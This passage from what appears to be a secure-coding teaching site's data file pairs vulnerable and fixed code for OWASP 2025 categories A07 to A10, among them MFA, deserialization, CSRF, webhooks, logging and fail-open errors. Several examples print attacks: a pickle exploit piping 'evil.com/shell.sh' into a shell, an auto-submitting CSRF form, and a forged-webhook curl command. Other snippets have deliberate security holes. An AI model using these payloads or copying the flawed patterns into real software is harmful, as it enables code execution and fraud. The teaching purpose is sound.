        header('Location: /dashboard');
        exit;
    }
}

// On every request, check session validity:
// if ($_SESSION['expires_at'] < time()) {
//     session_destroy();
//     header('Location: /login');
// }

// Old session ID "abc123" is invalidated.
// New session ID "xyz789" is generated.
// Attacker's "abc123" is useless.
?>`,
      },
      {
        title: "No Multi-Factor Authentication",
        vulnerableCode: `# Go — Vulnerable: Single-factor (password only) login
package main

func loginHandler(w http.ResponseWriter, r *http.Request) {
    var creds struct {
        Email    string \`json:"email"\`
        Password string \`json:"password"\`
    }
    json.NewDecoder(r.Body).Decode(&creds)

    user, err := db.FindUserByEmail(creds.Email)
    if err != nil {
        http.Error(w, "Invalid credentials", 401)
        return
    }

    if bcrypt.CompareHashAndPassword(
        []byte(user.PasswordHash), []byte(creds.Password),
    ) != nil {
        http.Error(w, "Invalid credentials", 401)
        return
    }

    // Immediately grants full access with just a password
    token := generateSessionToken(user)
    json.NewEncoder(w).Encode(map[string]string{"token": token})
}

// A compromised password = full account takeover
// Passwords can be stolen via:
// - Phishing emails
// - Data breaches (password reuse)
// - Keyloggers / malware
// - Social engineering`,
        secureCode: `# Go — Secure: TOTP-based Multi-Factor Authentication
package main

import "github.com/pquerna/otp/totp"

func loginHandler(w http.ResponseWriter, r *http.Request) {
    var creds struct {
        Email    string \`json:"email"\`
        Password string \`json:"password"\`
    }
    json.NewDecoder(r.Body).Decode(&creds)

    user, err := db.FindUserByEmail(creds.Email)
    if err != nil || bcrypt.CompareHashAndPassword(
        []byte(user.PasswordHash), []byte(creds.Password)) != nil {
        http.Error(w, "Invalid credentials", 401)
        return
    }

    // If MFA is enabled, require second factor
    if user.MFAEnabled {
        challenge := generateSecureToken(32)
        db.SaveMFAChallenge(user.ID, challenge, time.Now().Add(5*time.Minute))
        json.NewEncoder(w).Encode(map[string]interface{}{
            "requiresMFA": true,
            "challenge":   challenge,
        })
        return
    }
    issueSession(w, user)
}

func mfaVerifyHandler(w http.ResponseWriter, r *http.Request) {
    var req struct {
        Challenge string \`json:"challenge"\`
        TOTPCode  string \`json:"totpCode"\`
    }
    json.NewDecoder(r.Body).Decode(&req)

    record, err := db.FindValidMFAChallenge(req.Challenge)
    if err != nil {
        http.Error(w, "Invalid challenge", 401)
        return
    }

    user, _ := db.FindUserByID(record.UserID)

    // Verify TOTP code (time-based one-time password)
    if !totp.Validate(req.TOTPCode, user.MFASecret) {
        http.Error(w, "Invalid MFA code", 401)
        return
    }

    db.DeleteMFAChallenge(record.ID)
    issueSession(w, user)
}`,
      },
      {
        title: "Insecure Password Recovery",
        vulnerableCode: `// Java — Vulnerable: Security questions for recovery
@PostMapping("/api/recover")
public ResponseEntity<?> recover(@RequestBody RecoverRequest req) {
    User user = userRepository.findByEmail(req.getEmail());

    if (user == null) {
        // Leaks whether the email exists!
        return ResponseEntity.status(404)
            .body(Map.of("error", "Email not found."));
    }

    // Security questions are trivially guessable
    if (user.getMothersMaidenName().equals(req.getMothersMaidenName())
            && user.getPetName().equals(req.getPetName())) {
        // Immediately resets — no email verification!
        String newPassword = "TempPass123";
        user.setPassword(newPassword);
        userRepository.save(user);
        return ResponseEntity.ok(
            Map.of("newPassword", newPassword)
        );
        // Sends the new password in the response! (plaintext)
    }
    return ResponseEntity.status(400)
        .body(Map.of("error", "Incorrect answers"));
}

// Problems:
// 1. Security questions answerable from social media
// 2. No email verification
// 3. Reveals if email is registered (account enumeration)
// 4. New password sent in response body`,
        secureCode: `// Java — Secure: Token-based recovery via email
@PostMapping("/api/recover")
@RateLimiter(name = "recover")
public ResponseEntity<?> recover(@RequestBody RecoverRequest req) {
    // Always return the same response (prevent enumeration)
    ResponseEntity<?> response = ResponseEntity.ok(
        Map.of("message", "If registered, a reset link was sent.")
    );

    User user = userRepository.findByEmail(req.getEmail());
    if (user == null) return response;  // Don't reveal non-existence

    // Generate secure one-time token
    String token = UUID.randomUUID().toString();

    resetTokenRepository.save(new ResetToken(
        user.getId(),
        hashToken(token),
        Instant.now().plusSeconds(900),  // 15 min
        false  // not used yet
    ));

    emailService.send(req.getEmail(), new Email(
        "Password Reset Request",
        String.format(
            "Click to reset: https://app.com/reset?token=%s\\n" +
            "This link expires in 15 minutes.\\n" +
            "If you didn't request this, ignore this email.",
            token
        )
    ));

    // Log the recovery attempt
    securityLogger.info("PASSWORD_RESET_REQUESTED email={}",
        maskEmail(req.getEmail()));

    return response;
}`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A08: Software or Data Integrity Failures
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a08",
    code: "A08:2025",
    title: "Software or Data Integrity Failures",
    prevCode: "A08:2021",
    prevTitle: "Software and Data Integrity Failures",
    badge: { text: "Same #8", type: "same" },
    description:
      "Integrity Failures occur when code or data is used without verifying its authenticity. This includes insecure deserialization, CI/CD pipeline compromises, and auto-updates without signature verification.",
    comparison:
      'Position unchanged at <strong>#8</strong>. Minor rename from "and" to "or." The 2025 version maintains focus on insecure deserialization, unsigned updates, and untrusted data in critical decisions, but puts additional emphasis on CI/CD integrity in the context of the broader supply chain landscape.',
    sandbox: {
      title: "Unsafe Deserialization",
      description:
        'Simulate processing a serialized user profile object. The vulnerable version blindly executes data from an untrusted source. The secure version validates the schema and rejects unexpected properties.',
      vulnerableLabel: "Vulnerable: Blind eval()",
      secureLabel: "Secure: Schema Validation",
    },
    examples: [
      {
        title: "Insecure Deserialization",
        vulnerableCode: `# Python — Vulnerable: Using pickle to deserialize user data
import pickle
import base64

@app.route('/api/load-profile', methods=['POST'])
def load_profile():
    # Receive serialized data from the client
    data = request.form.get('profile_data')
    decoded = base64.b64decode(data)

    # DANGEROUS: pickle.loads() can execute arbitrary code!
    profile = pickle.loads(decoded)
    return jsonify(profile)

# Normal input works fine:
# profile = {"name": "Alice", "role": "user"}
# data = base64.b64encode(pickle.dumps(profile))

# But an attacker crafts a malicious pickle payload:
import os

class Exploit:
    def __reduce__(self):
        # This runs os.system() when unpickled!
        return (os.system, ('curl https://evil.com/shell.sh | sh',))

# malicious = base64.b64encode(pickle.dumps(Exploit()))
# POST /api/load-profile  profile_data=<malicious>
# → Server executes the attacker's shell command!`,
        secureCode: `# Python — Secure: JSON parsing + schema validation
import json
from marshmallow import Schema, fields, validate, ValidationError

class ProfileSchema(Schema):
    name = fields.Str(required=True, validate=validate.Length(max=100))
    email = fields.Email(required=True)
    role = fields.Str(
        required=True,
        validate=validate.OneOf(["user", "editor"])
    )

@app.route('/api/load-profile', methods=['POST'])
def load_profile():
    # Step 1: Parse as JSON (safe — cannot execute code)
    try:
        data = json.loads(request.data)
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON format"}), 400

    # Step 2: Validate against strict schema
    schema = ProfileSchema()
    try:
        validated = schema.load(data)
    except ValidationError as err:
        return jsonify({"error": err.messages}), 400

    # Only validated, typed, safe data reaches here
    return jsonify(validated)

# NEVER use pickle, yaml.load(), or eval() for user data
# ALWAYS use JSON + schema validation
# Libraries: marshmallow, pydantic, cerberus, jsonschema`,
      },
      {
        title: "Auto-Update Without Signature Verification",
        vulnerableCode: `// Go — Vulnerable: Auto-update with no signature check
package main

func checkForUpdate() error {
    resp, err := http.Get(
        "https://updates.example.com/latest.json",
    )
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    var update struct {
        Version     string \`json:"version"\`
        DownloadURL string \`json:"downloadUrl"\`
    }
    json.NewDecoder(resp.Body).Decode(&update)

    if update.Version > currentVersion {
        // Downloads and executes with no verification!
        binResp, _ := http.Get(update.DownloadURL)
        binary, _ := io.ReadAll(binResp.Body)
        os.WriteFile("/usr/local/bin/myapp", binary, 0755)
        // Restart the application with the new binary
        syscall.Exec("/usr/local/bin/myapp", os.Args, os.Environ())
    }
    return nil
}

// If the update server is compromised:
// 1. Attacker serves malicious latest.json
// 2. Points downloadUrl to malware
// 3. App downloads, saves, and EXECUTES the malware
// Real-world: SolarWinds Orion supply chain attack`,
        secureCode: `// Go — Secure: Signed updates with Ed25519 verification
package main

import (
    "crypto/ed25519"
    "crypto/sha256"
    "encoding/hex"
)

// Public key embedded in the application binary
var publicKey ed25519.PublicKey = mustDecodeHex("a1b2c3d4...")

func checkForUpdate() error {
    // Download update manifest
    manifest, _ := fetchJSON("https://updates.example.com/latest.json")

    if manifest.Version <= currentVersion {
        return nil
    }

    // Download the update AND its signature
    binary, _ := fetchBytes(manifest.DownloadURL)
    signature, _ := fetchBytes(manifest.SignatureURL)

    // Step 1: Verify the Ed25519 signature
    if !ed25519.Verify(publicKey, binary, signature) {
        log.Error("UPDATE SIGNATURE INVALID — possible tampering!")
        alertSecurityTeam("Update signature verification failed")
        return fmt.Errorf("update verification failed")
    }

    // Step 2: Verify the SHA-256 hash matches the manifest
    hash := sha256.Sum256(binary)
    if hex.EncodeToString(hash[:]) != manifest.SHA256 {
        return fmt.Errorf("hash mismatch")
    }

    // Step 3: Only now install the verified binary
    log.Info("Update verified successfully, installing v%s",
        manifest.Version)
    os.WriteFile("/usr/local/bin/myapp", binary, 0755)
    return nil
}`,
      },
      {
        title: "Client-Side Price Tampering",
        vulnLang: "markup",
        secureLang: "python",
        vulnerableCode: `<!-- Vulnerable: Price stored in hidden form field -->
<form action="/api/checkout" method="POST">
  <input type="hidden" name="productId" value="WIDGET-001">
  <input type="hidden" name="price" value="49.99">
  <input type="number" name="quantity" value="1">
  <button type="submit">Buy Now - $49.99</button>
</form>

<script>
  // JavaScript cart also trusts client-side prices:
  const cart = {
    items: [
      { id: 'WIDGET-001', name: 'Widget', price: 49.99, qty: 1 }
    ],
    total: 49.99
  };

  // Attacker opens DevTools and changes:
  // cart.items[0].price = 0.01
  // Or modifies the hidden input: value="0.01"
  // Or intercepts the POST request and changes price to 0.01
  //
  // Server trusts the client-submitted price:
  // $0.01 charged instead of $49.99!
</script>`,
        secureCode: `# Python Flask — Secure: Server is source of truth for pricing

@app.route('/api/checkout', methods=['POST'])
@login_required
def checkout():
    items = request.json.get('items', [])
    total = 0
    line_items = []

    for item in items:
        # Client sends ONLY product ID and quantity
        product = db.products.find_by_id(item['product_id'])
        if not product:
            return jsonify({"error": "Product not found"}), 400

        quantity = int(item['quantity'])
        if quantity < 1 or quantity > 100:
            return jsonify({"error": "Invalid quantity"}), 400

        # Look up the REAL price from the database
        line_total = product.price * quantity
        total += line_total
        line_items.append({
            "product": product.name,
            "price": product.price,
            "quantity": quantity,
            "subtotal": line_total
        })

    # Charge the server-calculated total
    charge = stripe.PaymentIntent.create(
        amount=int(total * 100),  # Stripe uses cents
        currency='usd',
        metadata={'user_id': current_user.id}
    )

    return jsonify({
        "order_id": charge.id,
        "total": total,
        "items": line_items
    })`,
      },
      {
        title: "Missing CSRF Protection",
        vulnLang: "markup",
        secureLang: "ruby",
        vulnerableCode: `<!-- Vulnerable: No CSRF token on state-changing forms -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="alice">
  <input name="amount" value="100">
  <button type="submit">Transfer</button>
</form>

<!-- Attacker's page at https://evil.com/ -->
<h1>Click here to win a prize!</h1>
<form action="https://bank.com/transfer" method="POST"
      id="csrfForm" style="display:none;">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>
  // Auto-submits the hidden form
  document.getElementById('csrfForm').submit();

  // User's browser sends their bank cookies automatically
  // The bank sees a valid authenticated request
  // $10,000 is transferred to the attacker

  // The victim doesn't even see what happened —
  // the form submits instantly when they visit evil.com
</script>`,
        secureCode: `# Ruby on Rails — Secure: Built-in CSRF protection
class ApplicationController < ActionController::Base
  # Rails includes CSRF protection by default!
  protect_from_forgery with: :exception

  # Every form automatically includes a hidden CSRF token:
  # <form action="/transfer" method="POST">
  #   <input type="hidden" name="authenticity_token"
  #          value="random-csrf-token-here">
  #   ...
  # </form>
end

class TransfersController < ApplicationController
  def create
    # Rails automatically verifies the CSRF token
    # If token is missing or invalid → 422 Unprocessable Entity

    @transfer = Transfer.new(transfer_params)
    @transfer.user = current_user

    if @transfer.save
      render json: { message: "Transfer successful" }
    else
      render json: { error: @transfer.errors }, status: 400
    end
  end

  private

  def transfer_params
    params.require(:transfer).permit(:to, :amount)
  end
end

# The attacker's form at evil.com won't have the CSRF token
# → Request is rejected with 422

# Additionally: SameSite cookies prevent cross-origin sending
# Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly`,
      },
      {
        title: "Unverified Webhook Payloads",
        vulnerableCode: `// Node.js — Vulnerable: Trusting webhook without verification
app.post('/webhooks/payment', (req, res) => {
  const event = req.body;

  // Blindly trusts the incoming JSON
  if (event.type === 'payment.completed') {
    const orderId = event.data.orderId;
    const amount = event.data.amount;

    // Mark order as paid based on unverified data!
    db.orders.update(orderId, {
      status: 'paid',
      amountPaid: amount
    });

    fulfillOrder(orderId);
  }

  res.json({ received: true });
});

// Attacker sends a fake webhook:
// curl -X POST https://yoursite.com/webhooks/payment \\
//   -H "Content-Type: application/json" \\
//   -d '{"type":"payment.completed",
//        "data":{"orderId":"ORD-123","amount":0}}'
//
// Order marked as paid without any real payment!
// Attacker gets free products.`,
        secureCode: `// Node.js — Secure: Verify webhook signature
const WEBHOOK_SECRET = process.env.STRIPE_WEBHOOK_SECRET;

app.post('/webhooks/payment',
  express.raw({ type: 'application/json' }),
  (req, res) => {
    const signature = req.headers['stripe-signature'];

    let event;
    try {
      // Verify the signature using the shared secret
      event = stripe.webhooks.constructEvent(
        req.body,        // Raw body (not parsed JSON)
        signature,       // Signature from Stripe headers
        WEBHOOK_SECRET   // Your webhook signing secret
      );
    } catch (err) {
      securityLogger.warn({
        event: 'WEBHOOK_VERIFICATION_FAILED',
        error: err.message,
        ip: req.ip
      });
      return res.status(400).json({ error: 'Invalid signature' });
    }

    // Signature verified — safe to process
    if (event.type === 'payment_intent.succeeded') {
      const order = db.orders.findById(
        event.data.object.metadata.orderId
      );
      // Also verify the amount matches your records
      if (order.total !== event.data.object.amount) {
        securityLogger.critical({ event: 'AMOUNT_MISMATCH' });
        return res.status(400).json({ error: 'Amount mismatch' });
      }
      db.orders.update(order.id, { status: 'paid' });
    }

    res.json({ received: true });
  }
);`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A09: Security Logging and Alerting Failures
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a09",
    code: "A09:2025",
    title: "Security Logging and Alerting Failures",
    prevCode: "A09:2021",
    prevTitle: "Security Logging and Monitoring Failures",
    badge: { text: "Renamed — Same #9", type: "same" },
    description:
      "Without adequate logging and active alerting, breaches go undetected, incidents can't be investigated, and organizations lose visibility into their security posture.",
    comparison:
      'Renamed from "Monitoring" to <strong>"Alerting"</strong> in 2025. This subtle but important shift emphasizes the need for <em>proactive, automated detection and notification</em> rather than passive log collection. Position unchanged at #9.',
    sandbox: {
      title: "Security Event Logging",
      description:
        "Perform actions (login attempts, data access) and see the difference between an app with no logging versus one that records security events with timestamps, severity levels, and automated alerts.",
      vulnerableLabel: "Vulnerable: No Logging",
      secureLabel: "Secure: Full Audit Trail + Alerts",
    },
    examples: [
      {
        title: "No Security Logging",
        vulnerableCode: `# Go — Vulnerable: No security logging at all
package main

func login(username, password string) bool {
    user, err := db.FindUser(username)
    if err != nil || !checkPassword(password, user.Hash) {
        // Failed login — no record, no alert, no trace
        return false
    }
    return true
}

func accessRecord(userID string, recordID string) (*Record, error) {
    // Sensitive data accessed — no audit log
    return db.GetRecord(recordID)
}

func changePermissions(targetUser *User, newRole string) {
    // Privilege escalation — completely invisible
    targetUser.Role = newRole
    db.Save(targetUser)
}

// An attacker can:
// 1. Brute-force logins undetected
// 2. Access sensitive data with no trail
// 3. Escalate privileges silently
// 4. Remain undetected for months
//
// Average time to detect a breach: 204 days (IBM 2023)
// Without logs, you won't even know you were breached.`,
        secureCode: `# Go — Secure: Structured logging with alerting
package main

import "go.uber.org/zap"

var securityLog = zap.NewProduction()

func login(username, password string) bool {
    user, err := db.FindUser(username)
    if err != nil || !checkPassword(password, user.Hash) {
        securityLog.Warn("AUTH_FAILURE",
            zap.String("user", username),
            zap.String("ip", getClientIP()),
            zap.String("user_agent", getUserAgent()),
        )

        // Check for brute force pattern
        recentFailures := getRecentFailures(username)
        if recentFailures >= 5 {
            securityLog.Error("BRUTE_FORCE_DETECTED",
                zap.String("user", username),
                zap.Int("failures", recentFailures),
            )
            triggerAlert("Brute force attack", username)
        }
        return false
    }

    securityLog.Info("AUTH_SUCCESS",
        zap.String("user", username),
        zap.String("ip", getClientIP()),
    )
    return true
}

func accessRecord(userID, recordID string) (*Record, error) {
    record, err := db.GetRecord(recordID)
    securityLog.Info("DATA_ACCESS",
        zap.String("user", userID),
        zap.String("record", recordID),
        zap.Bool("success", err == nil),
    )
    return record, err
}`,
      },
      {
        title: "Logging Sensitive Data (Passwords, Tokens)",
        vulnerableCode: `# Python — Vulnerable: Logging sensitive information
import logging

logger = logging.getLogger('app')

def login(request):
    email = request.json.get('email')
    password = request.json.get('password')

    # Logs the actual password!
    logger.info('Login attempt', extra={
        'email': email,
        'password': password,      # NEVER log passwords!
        'headers': dict(request.headers)  # Contains auth tokens
    })

    user = authenticate(email, password)
    if user:
        token = generate_token(user)
        logger.info('Login successful', extra={
            'token': token,        # NEVER log session tokens!
            'user': vars(user)     # May include PII, password hash
        })
        return jsonify({'token': token})

# Log file now contains:
# {"email":"alice@co.com","password":"MySecret123!"}
# {"token":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOi..."}
# If logs are breached, ALL credentials are exposed.
# Log aggregation services (Datadog, Splunk) store them too.`,
        secureCode: `# Python — Secure: Structured logging without sensitive data
import logging

logger = logging.getLogger('app')

def mask_email(email):
    local, domain = email.split('@')
    return f"{local[0]}***@{domain}"

def login(request):
    email = request.json.get('email')
    password = request.json.get('password')

    # Log the EVENT, not the credentials
    logger.info('Login attempt', extra={
        'email': mask_email(email),  # "a***@co.com"
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'timestamp': datetime.utcnow().isoformat()
        # NO password, NO token, NO full email
    })

    user = authenticate(email, password)
    if user:
        token = generate_token(user)
        logger.info('Login successful', extra={
            'user_id': user.id,            # Internal ID only
            'email': mask_email(email),
            'session_created': True
            # NO token value, NO user object
        })
        return jsonify({'token': token})

# Logs are safe even if breached:
# {"email":"a***@co.com","ip":"1.2.3.4","session_created":true}`,
      },
      {
        title: "No Log Integrity Protection",
        vulnerableCode: `// Java — Vulnerable: Logs stored as plain text files
public class AuditLogger {
    private static final String LOG_FILE =
        "/var/log/app/security.log";

    public static void log(Map<String, Object> event) {
        String line = new ObjectMapper()
            .writeValueAsString(event) + "\\n";
        Files.writeString(
            Path.of(LOG_FILE), line,
            StandardOpenOption.APPEND
        );
    }
}

// Problems:
// 1. An attacker with file access can DELETE log entries
//    to cover their tracks
//
// 2. Logs can be MODIFIED to frame another user:
//    Original: {"user":"attacker","action":"delete_all"}
//    Modified: {"user":"intern","action":"delete_all"}
//
// 3. No tamper detection — nobody knows logs were changed
//
// 4. Logs on the same server as the app — if the server
//    is compromised, logs are compromised too
//
// 5. No timestamps from a trusted source
//    Attacker can backdate events`,
        secureCode: `// Java — Secure: Tamper-evident, append-only remote logging
public class SecureAuditLogger {
    private String previousHash = "0".repeat(64);
    private final SIEMClient siem;
    private final S3Client s3;

    public void log(Map<String, Object> event) {
        // Add metadata
        event.put("timestamp", Instant.now().toString());
        event.put("sequence", nextSequence());
        event.put("previousHash", previousHash);

        // Chain hash: links each entry to the previous one
        String json = objectMapper.writeValueAsString(event);
        String hash = sha256(json);
        event.put("hash", hash);
        previousHash = hash;

        // Write to MULTIPLE destinations simultaneously
        // 1. Local (fast, may be compromised)
        localLogger.write(event);

        // 2. Remote SIEM (append-only, separate permissions)
        siem.send(event);

        // 3. Immutable storage (S3 with Object Lock)
        s3.putObject(PutObjectRequest.builder()
            .bucket("audit-logs")
            .key(event.get("timestamp") + "-" + hash + ".json")
            .objectLockMode(ObjectLockMode.COMPLIANCE)
            .objectLockRetainUntilDate(
                Instant.now().plus(365, ChronoUnit.DAYS))
            .build(),
            RequestBody.fromString(json)
        );
    }
}

// If an attacker modifies any entry, the hash chain breaks.
// Remote/immutable copies are out of attacker's reach.`,
      },
      {
        title: "Missing Alert Thresholds",
        vulnerableCode: `# Ruby — Vulnerable: Logs exist but nobody watches them
def security_log(event)
  # Writes to a log file and... that's it
  puts event.to_json
  File.open("security.log", "a") { |f| f.puts event.to_json }
end

# These events are logged but never trigger alerts:
security_log({ event: "LOGIN_FAILURE", user: "admin" })
security_log({ event: "LOGIN_FAILURE", user: "admin" })
security_log({ event: "LOGIN_FAILURE", user: "admin" })
# ... 10,000 more failures — nobody notices

security_log({ event: "PERMISSION_CHANGE", role: "admin" })
# A user granted themselves admin — no alert

security_log({ event: "DATA_EXPORT", records: 50000 })
# 50,000 records exported — no alert

# Average time to detect a breach: 204 days (IBM 2023)
# Logs without alerting are forensic evidence at best
# — too late to prevent the damage.`,
        secureCode: `# Ruby — Secure: Automated alert rules with escalation
class SecurityMonitor
  ALERT_RULES = [
    {
      name: "Brute Force Detection",
      condition: ->(events) {
        events.count { |e|
          e[:event] == "LOGIN_FAILURE" &&
          e[:timestamp] > 5.minutes.ago
        } >= 5
      },
      severity: "HIGH",
      action: :lock_account
    },
    {
      name: "Privilege Escalation",
      condition: ->(events) {
        events.any? { |e|
          e[:event] == "PERMISSION_CHANGE" &&
          e[:new_role] == "admin"
        }
      },
      severity: "CRITICAL",
      action: :notify_soc
    },
    {
      name: "Mass Data Export",
      condition: ->(events) {
        events.any? { |e|
          e[:event] == "DATA_EXPORT" && e[:records] > 1000
        }
      },
      severity: "HIGH",
      action: :notify_dlp
    }
  ]

  def process_event(event)
    SecurityLog.create!(event)

    ALERT_RULES.each do |rule|
      if rule[:condition].call(recent_events)
        trigger_alert(
          rule: rule[:name],
          severity: rule[:severity],
          event: event,
          action: rule[:action]
        )
      end
    end
  end
end

# Alerts sent via: PagerDuty, Slack, email, SMS
# Response time target: < 15 minutes for CRITICAL`,
      },
      {
        title: "Client-Side Only Logging",
        vulnerableCode: `// JavaScript — Vulnerable: Events logged only in browser
function onLoginFailure(username) {
  // Only logs to browser console
  console.warn('Login failed for:', username);
}

function onSuspiciousActivity(details) {
  // Logs to localStorage — attacker can clear it
  const logs = JSON.parse(
    localStorage.getItem('securityLogs') || '[]'
  );
  logs.push({ ...details, time: Date.now() });
  localStorage.setItem('securityLogs', JSON.stringify(logs));
}

// Problems:
// 1. console.log/warn disappear when tab is closed
// 2. localStorage is clearable by the attacker:
//    localStorage.removeItem('securityLogs')
// 3. No server-side record of security events
// 4. Cannot correlate events across users/sessions
// 5. Cannot trigger automated responses
// 6. Useless for forensics after an incident`,
        secureCode: `// JavaScript — Secure: Client events forwarded to server
const SecurityTelemetry = {
  queue: [],

  track(event) {
    this.queue.push({
      ...event,
      timestamp: new Date().toISOString(),
      sessionId: getSessionId(),
      page: window.location.pathname,
      userAgent: navigator.userAgent
    });

    // Flush immediately for high-severity events
    if (event.severity === 'HIGH' || event.severity === 'CRITICAL') {
      this.flush();
    }
  },

  async flush() {
    if (this.queue.length === 0) return;
    const batch = this.queue.splice(0);

    try {
      // Use sendBeacon for reliability (survives page close)
      const payload = JSON.stringify(batch);
      if (navigator.sendBeacon) {
        navigator.sendBeacon('/api/security-events', payload);
      } else {
        await fetch('/api/security-events', {
          method: 'POST',
          body: payload,
          keepalive: true  // Survives page navigation
        });
      }
    } catch {
      // Re-queue on failure
      this.queue.unshift(...batch);
    }
  }
};

// Auto-flush every 5 seconds
setInterval(() => SecurityTelemetry.flush(), 5000);

// Flush on page unload (most reliable method)
window.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') {
    SecurityTelemetry.flush();
  }
});`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A10: Mishandling of Exceptional Conditions
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a10",
    code: "A10:2025",
    title: "Mishandling of Exceptional Conditions",
    prevCode: null,
    prevTitle: null,
    badge: { text: "NEW", type: "new" },
    description:
      'A brand-new category covering programs that fail to prevent, detect, and respond to unusual situations. This includes errors that "fail open" (granting access on error), stack traces exposed to users, and inconsistent exception handling.',
    comparison:
      "<strong>Entirely new in 2025.</strong> Replaces A10:2021 (SSRF), which was merged into Broken Access Control. This category covers 24 CWEs related to improper error handling and reflects a key principle: secure software must fail safely and predictably. It was added based on community survey input highlighting the frequency and severity of error-handling failures.",
    sandbox: {
      title: "Fail Open vs. Fail Closed",
      description:
        'Simulate an authorization check where the backend service is down. The vulnerable version "fails open" and grants access. The secure version "fails closed" and denies access. Click to trigger the failing auth service.',
      vulnerableLabel: 'Vulnerable: "Fail Open"',
      secureLabel: 'Secure: "Fail Closed"',
    },
    examples: [
      {
        title: '"Fail Open" Authorization',
        vulnerableCode: `# Python — Vulnerable: "Fail Open" — errors grant access
import requests

def check_authorization(user_id, resource):
    try:
        response = requests.get(
            f"http://auth-service/check"
            f"?user={user_id}&resource={resource}",
            timeout=5
        )
        data = response.json()
        return data.get("authorized", False)

    except Exception as e:
        # Service is down or network error
        print(f"Auth service unavailable: {e}")
        return True  # ← FAIL OPEN: grants access on error!

# When the auth service is down or slow:
# - ALL users get access to ALL resources
# - An attacker can intentionally overload the auth service
#   (DDoS) and then access everything
# - Network glitches = temporary security bypass

# This is one of the most common and dangerous patterns
# in security-critical code.`,
        secureCode: `# Python — Secure: "Fail Closed" — errors deny access
import requests
import logging

security_logger = logging.getLogger('security')

def check_authorization(user_id, resource):
    try:
        response = requests.get(
            f"http://auth-service/check"
            f"?user={user_id}&resource={resource}",
            timeout=5
        )

        if response.status_code != 200:
            raise ValueError(
                f"Auth service returned {response.status_code}"
            )

        data = response.json()
        return data.get("authorized") is True  # Strict boolean check

    except Exception as e:
        security_logger.error(
            "AUTH_ERROR",
            extra={
                "user_id": user_id,
                "resource": resource,
                "error": str(e),
                "severity": "HIGH"
            }
        )
        return False  # ← FAIL CLOSED: deny by default

# When the auth service is down:
# - All access is denied (safe default)
# - Error is logged with full context
# - Security team is alerted
# - Users see "Service temporarily unavailable"`,
      },
      {
        title: "Exposed Stack Traces in Production",
        vulnerableCode: `// Java Spring Boot — Vulnerable: Full stack trace to client
@ControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(Exception.class)
    public ResponseEntity<?> handleAll(Exception ex) {
        return ResponseEntity.status(500).body(Map.of(
            "message", ex.getMessage(),
            // Full stack trace exposed:
            "stackTrace", Arrays.stream(ex.getStackTrace())
                .map(StackTraceElement::toString)
                .collect(Collectors.toList()),
            // "com.myapp.db.UserRepository.findById(UserRepository.java:42)"
            // "org.postgresql.core.v3.QueryExecutorImpl.execute(...)"

            // Reveals:
            // - Package structure: com.myapp.db
            // - Database type: PostgreSQL
            // - File paths and line numbers
            // - Framework versions
            "cause", ex.getCause() != null ? ex.getCause().getMessage() : null
        ));
    }
}`,
        secureCode: `// Java Spring Boot — Secure: Generic errors with internal logging
@ControllerAdvice
public class GlobalExceptionHandler {

    private static final Logger log =
        LoggerFactory.getLogger(GlobalExceptionHandler.class);

    private static final Map<String, String> ERROR_MESSAGES = Map.of(
        "VALIDATION", "The provided data is invalid.",
        "NOT_FOUND", "The requested resource was not found.",
        "UNAUTHORIZED", "Authentication required.",
        "FORBIDDEN", "You do not have permission.",
        "DEFAULT", "An unexpected error occurred."
    );

    @ExceptionHandler(Exception.class)
    public ResponseEntity<?> handleAll(
            Exception ex, HttpServletRequest request) {
        String errorId = UUID.randomUUID().toString();

        // Full details logged internally
        log.error("Unhandled exception. errorId={}, path={}, user={}",
            errorId, request.getRequestURI(),
            SecurityContextHolder.getContext()
                .getAuthentication().getName(),
            ex  // Stack trace goes to server logs only
        );

        // Generic message to client
        String category = categorizeException(ex);
        return ResponseEntity.status(
            ex instanceof AppException
                ? ((AppException) ex).getStatusCode() : 500
        ).body(Map.of(
            "error", ERROR_MESSAGES.getOrDefault(category, ERROR_MESSAGES.get("DEFAULT")),
            "referenceId", errorId
            // No stack trace, no SQL, no internal paths
        ));
    }
}`,
      },
      {
        title: "Unhandled Promise Rejections / Async Errors",
        vulnerableCode: `// Node.js — Vulnerable: Unhandled async errors
async function processOrder(orderId) {
  const order = await db.orders.findById(orderId);
  const payment = await chargeCard(order.total);
  const shipping = await createShipment(order);
  // If chargeCard fails, createShipment never runs
  // If createShipment fails, order is charged but not shipped
  // No cleanup, no rollback, inconsistent state
}

// Called without catch:
app.post('/api/orders/:id/process', async (req, res) => {
  processOrder(req.params.id);
  // No await! Fire and forget
  // If it fails, the error is completely lost
  res.json({ message: 'Processing started' });
});

// Node.js default: unhandled rejection = crash in production
// UnhandledPromiseRejectionWarning → process exits
// All in-flight requests are dropped
// Users see ERR_CONNECTION_REFUSED`,
        secureCode: `// Node.js — Secure: Proper async error handling + rollback
async function processOrder(orderId) {
  const order = await db.orders.findById(orderId);
  let paymentId = null;

  try {
    // Step 1: Charge the card
    const payment = await chargeCard(order.total);
    paymentId = payment.id;

    // Step 2: Create shipment
    const shipping = await createShipment(order);

    // Step 3: Update order status
    await db.orders.update(orderId, {
      status: 'completed',
      paymentId,
      trackingNumber: shipping.tracking
    });
  } catch (error) {
    // Compensating action: refund if payment was taken
    if (paymentId) {
      await refundPayment(paymentId).catch(refundErr => {
        logger.critical({
          event: 'REFUND_FAILED',
          orderId, paymentId,
          error: refundErr.message
        });
        // Alert for manual intervention
      });
    }

    await db.orders.update(orderId, {
      status: 'failed', error: error.message
    });

    throw error; // Re-throw for the route handler
  }
}

// Route properly awaits and catches
app.post('/api/orders/:id/process', async (req, res) => {
  try {
    await processOrder(req.params.id);
    res.json({ status: 'completed' });
  } catch (error) {
    res.status(500).json({
      error: 'Order processing failed',
